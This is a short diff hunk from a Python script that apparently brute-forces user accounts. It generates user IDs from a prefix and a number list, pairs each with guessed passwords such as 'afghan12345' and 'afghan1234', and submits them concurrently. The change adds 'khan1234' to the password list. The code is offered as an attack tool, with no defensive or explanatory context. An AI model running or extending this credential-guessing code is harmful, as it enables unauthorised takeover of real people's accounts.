@@ -742,7 +742,7 @@ def awm1():
         print('\033[1;32m--------------------------------------------------------------') 
         for love in user:
             uid = code+love
-            pwx = [love,'afghan12345', 'afghan1234']
+            pwx = [love,'afghan12345', 'afghan1234', 'khan1234']
             manshera.submit(freeq,uid,pwx,tl)
     print('')
     print('\033[1;32m--------------------------------------------------------------') 
